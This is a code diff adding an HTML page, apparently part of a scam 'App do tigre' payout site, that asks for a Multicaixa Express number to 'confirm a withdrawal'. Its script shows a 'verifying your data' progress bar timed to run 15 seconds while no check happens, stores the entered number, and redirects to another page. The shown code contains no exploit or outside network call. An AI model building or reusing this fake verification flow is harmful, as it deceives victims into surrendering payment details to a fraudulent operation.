@@ -1,0 +1,199 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- TODO: Set the document title to the name of your application -->
+    <title>App do tigre Ao</title>
+    <meta name="description" content="Acessse o link">
+    <meta name="author" content="Lovable">
+
+    <link rel="stylesheet" href="indexa.css">
+
+</head>
+
+<body>
+    <div id="root">
+        <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events: none;">
+            <ol tabindex="-1"
+                class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]">
+            </ol>
+        </div>
+        <section aria-label="Notifications alt+T" tabindex="-1" aria-live="polite" aria-relevant="additions text"
+            aria-atomic="false"></section>
+        <div class="min-h-screen flex flex-col items-center justify-center relative overflow-hidden">
+            <div class="absolute inset-0"><img src="temple-bg-xbdkwM8g.jpg" alt="" class="w-full h-full object-cover">
+                <div class="absolute inset-0"
+                    style="background: linear-gradient(rgba(0, 0, 0, 0.3) 0%, rgba(139, 10, 10, 0.6) 50%, rgba(0, 0, 0, 0.85) 100%);">
+                </div>
+            </div>
+            <div class="relative z-10 w-full max-w-[380px] mx-auto px-6 fade-up">
+                <div style="opacity: 1; transform: none;">
+                    <div class="rounded-2xl p-6 text-center"
+                        style=" width: 100%;background: linear-gradient(rgba(20, 5, 5, 0.92), rgba(10, 2, 2, 0.96)); border: 1px solid rgba(218, 165, 32, 0.3); box-shadow: rgba(0, 0, 0, 0.5) 0px 0px 40px;">
+                        <a href="witfraw.html"> <button
+                                class="text-sm text-muted-foreground mb-4 cursor-pointer flex items-center gap-1">←
+                                Voltar</button> </a>
+                        <h1 class="text-xl font-extrabold text-card-foreground mb-4 text-left">Multicaixa Express</h1>
+                        <div class="text-left mb-2"><label class="text-sm text-muted-foreground">Número Express</label>
+                        </div><input id="ibanInput" type="text" placeholder="9XX XXX XXX"
+                            class="w-full p-4 rounded-xl mb-6 text-card-foreground placeholder:text-muted-foreground outline-none"
+                            value=""
+                            style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2);"><button
+                            id="confirmBtn" type="button" disabled=""
+                            class="w-full py-3.5 rounded-xl text-lg font-bold cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
+                            tabindex="0"
+                            style="background: linear-gradient(135deg, rgb(255, 217, 0), rgb(220, 166, 30), rgb(255, 128, 0)); color: rgb(26, 5, 5); box-shadow: rgba(255, 215, 0, 0.55) 0px 0px 35px; transform: none;">Confirmar
+                            Levantamento</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- TELA DE CARREGAMENTO -->
+    <div id="loadingScreen">
+        <div class="loading-box">
+            <div class="loading-title">Verificando seus dados</div>
+            <div class="loading-sub">por favor aguarde</div>
+
+            <div class="spinner"></div>
+
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+
+            <div class="percent" id="percentText">0%</div>
+        </div>
+    </div>
+
+</body>
+
+
+
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+    }
+
+    /* OVERLAY */
+    #loadingScreen {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.95);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+    /* BOX */
+    .loading-box {
+        text-align: center;
+    }
+
+    /* TEXTO */
+    .loading-title {
+        color: #00ff88;
+        font-size: 20px;
+        font-weight: bold;
+    }
+
+    .loading-sub {
+        color: white;
+        margin-top: 5px;
+        margin-bottom: 20px;
+    }
+
+    /* SPINNER */
+    .spinner {
+        width: 50px;
+        height: 50px;
+        border: 5px solid rgba(255, 255, 255, 0.2);
+        border-top: 5px solid #00ff88;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+
+    /* BARRA */
+    .progress-container {
+        width: 250px;
+        height: 8px;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 10px;
+        overflow: hidden;
+        margin: auto;
+        position: relative;
+    }
+
+    .progress-bar {
+        height: 100%;
+        width: 0%;
+        background: #00ff88;
+        transition: width 0.1s;
+    }
+
+    /* PERCENTAGEM */
+    .percent {
+        margin-top: 10px;
+        color: white;
+        font-size: 14px;
+    }
+</style>
+
+
+<script>
+    const input = document.getElementById("ibanInput");
+    const button = document.getElementById("confirmBtn");
+    const loading = document.getElementById("loadingScreen");
+    const progressBar = document.getElementById("progressBar");
+    const percentText = document.getElementById("percentText");
+
+    // ativar botão
+    input.addEventListener("input", () => {
+        button.disabled = input.value.trim() === "";
+    });
+
+    // clicar botão
+    button.addEventListener("click", () => {
+        loading.style.display = "flex";
+
+        let duration = 15000; // 🔥 15 segundos
+        let intervalTime = 50;
+        let steps = duration / intervalTime;
+        let progress = 0;
+        let increment = 100 / steps;
+
+        const interval = setInterval(() => {
+            progress += increment;
+
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+            }
+
+            progressBar.style.width = progress + "%";
+            percentText.textContent = Math.floor(progress) + "%";
+
+        }, intervalTime);
+
+        // depois de 15 segundos → mudar página
+        setTimeout(() => {
+            localStorage.setItem("iban", input.value);
+            window.location.href = "xyzm.html";
+        }, duration);
+    });
+</script>
+
+</html>
